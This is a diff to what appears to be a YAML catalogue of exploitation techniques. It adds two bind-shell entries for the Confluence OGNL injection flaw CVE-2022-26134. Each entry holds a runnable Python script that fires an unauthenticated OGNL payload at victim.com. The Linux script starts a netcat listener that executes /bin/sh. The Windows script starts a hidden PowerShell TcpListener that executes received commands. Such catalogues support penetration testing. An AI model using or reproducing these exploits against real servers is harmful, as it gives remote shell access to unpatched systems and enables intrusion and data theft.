@@ -29,6 +29,49 @@ docker:
     \ initialise.\nThe OGNL injection is active immediately \u2014 setup completion\
     \ is not required.\n"
 functions:
+  bind-shell:
+  - code: "# CVE-2022-26134: bind shell via OGNL Runtime.exec() in the URL path\n\
+      python3 - <<'EOF'\nimport urllib.parse, requests\n\nTARGET = \"http://victim.com:8090\"\
+      \n\nognl = (\n    \"${@java.lang.Runtime@getRuntime().exec(\"\n    \"new String[]{\\\
+      \"/bin/sh\\\",\\\"-c\\\",\\\"nc -lvp 12345 -e /bin/sh &\\\"}\"\n    \")}\"\n\
+      )\nrequests.get(TARGET + \"/\" + urllib.parse.quote(ognl, safe=\"\"))\nprint(\"\
+      [*] Bind shell listener opened on TCP 12345 \u2014 connect with: nc victim.com\
+      \ 12345\")\nEOF\n"
+    comment: |
+      CVE-2022-26134: opens a bind shell on TCP 12345 via OGNL Runtime.exec() in the URL path.
+      The trailing & detaches nc from the process so the HTTP request completes.
+      Requires nc with -e support on the Confluence host (standard BusyBox/Linux).
+      Connect with: nc victim.com 12345
+    connector: tcp-client
+    contexts:
+      unauthenticated:
+    platform: linux
+    tty: false
+    version: |
+      1.3.0 - 7.18.0 (before 7.4.17 / 7.13.7 / 7.14.3 / 7.15.2 / 7.16.4 / 7.17.4 / 7.18.1)
+  - code: "# CVE-2022-26134: PowerShell bind shell for Windows Confluence Server\n\
+      python3 - <<'EOF'\nimport urllib.parse, requests\n\nTARGET = \"http://victim.com:8090\"\
+      \n\nps = (\n    '$l=New-Object Net.Sockets.TcpListener 12345;$l.Start();'\n\
+      \    '$c=$l.AcceptTcpClient();$s=$c.GetStream();'\n    '$b=New-Object byte[]\
+      \ 1024;'\n    'while(($i=$s.Read($b,0,$b.Length)) -ne 0){'\n    '$r=[Text.Encoding]::ASCII.GetBytes((iex\
+      \ ([Text.Encoding]::ASCII.GetString($b,0,$i)) |Out-String));'\n    '$s.Write($r,0,$r.Length);$s.Flush()}'\n\
+      )\nognl = (\n    \"${@java.lang.Runtime@getRuntime().exec(\"\n    \"new String[]{\\\
+      \"powershell\\\",\\\"-NoP\\\",\\\"-NonI\\\",\\\"-W\\\",\\\"Hidden\\\",\"\n \
+      \   \"\\\"-Exec\\\",\\\"Bypass\\\",\\\"-Command\\\",\\\"\" + ps + \"\\\"}\"\n\
+      \    \")}\"\n)\nrequests.get(TARGET + \"/\" + urllib.parse.quote(ognl, safe=\"\
+      \"))\nprint(\"[*] Bind shell listener opened on TCP 12345 \u2014 connect with:\
+      \ nc victim.com 12345\")\nEOF\n"
+    comment: |
+      CVE-2022-26134: PowerShell TcpListener bind shell for Windows Confluence Server deployments.
+      Uses the same OGNL Runtime.exec() injection as the Linux variant.
+      Connect with: nc victim.com 12345
+    connector: tcp-client
+    contexts:
+      unauthenticated:
+    platform: windows
+    tty: false
+    version: |
+      1.3.0 - 7.18.0 (before 7.4.17 / 7.13.7 / 7.14.3 / 7.15.2 / 7.16.4 / 7.17.4 / 7.18.1)
   file-read:
   - code: |
       # CVE-2022-26134: read a server-side file via OGNL BufferedReader
